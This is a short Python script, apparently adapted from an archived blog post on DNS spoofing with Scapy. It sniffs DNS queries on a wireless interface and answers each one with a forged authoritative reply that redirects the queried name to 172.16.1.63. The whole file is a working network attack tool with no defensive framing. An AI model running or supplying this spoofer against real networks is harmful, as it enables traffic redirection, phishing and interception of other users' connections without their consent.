# http://archive.is/20140219062550/danmcinerney.org/reliable-dns-spoofing-with-python-scapy-nfqueue/

from scapy.all import *

from scapy.all import *
def dns_spoof(pkt):
    redirect_to = '172.16.1.63'
    if pkt.haslayer(DNSQR): # DNS question record
        print(pkt[DNS].qd.qname)
        spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
                      UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
                      DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa = 1, qr=1, \
                      an=DNSRR(rrname=pkt[DNS].qd.qname,  ttl=10, rdata=redirect_to))
        send(spoofed_pkt)
        print('Sent:', spoofed_pkt.summary())
sniff(filter='udp port 53', iface='Intel(R) Dual Band Wireless-AC 3165', store=0, prn=dns_spoof)
